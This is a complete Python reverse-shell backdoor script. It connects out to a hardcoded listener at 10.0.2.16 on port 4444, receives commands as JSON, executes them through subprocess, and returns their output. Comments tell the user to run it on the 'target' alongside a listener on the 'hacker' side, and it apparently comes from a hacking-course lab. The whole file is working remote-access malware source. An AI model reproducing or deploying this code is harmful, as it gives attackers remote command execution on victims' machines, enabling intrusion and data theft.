#!/usr/bin/env python
import socket,subprocess,json
class Backdoor:
    def __init__(self,ip,port):
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        self.connection.connect((ip,port))
    def reliable_send(self,data):#use instead of socket send method for everytime we need to send data 
        json_data=json.dumps(data)#convert to json
        self.connection.send(json_data)   
    def reliable_receive(self):#best implementation look serialisation once.value error is due to receiving and unpacking incomplete data
        json_data=""
        while True:
            try:
                json_data=json_data + self.connection.recv(1024)
                return json.loads(json_data) 
            except ValueError:
                continue            
    def execute_system_command(self,command):
        return subprocess.check_output(command)
    def run(self):
        while True:
            command=self.reliable_receive() #we receive data in form of list and it will execute command without converting to string because check_output of subprocess execute both string as well as list data
            if command[0]=="exit":
                self.connection.close()
                exit()
            command_result=self.execute_system_command(command) 
            self.reliable_send(command_result)
        self.connection.close()
backdoor_instance=Backdoor("10.0.2.16",4444)
backdoor_instance.run()        


# execute this in target
# at same time execute listener1_class.py in hacker
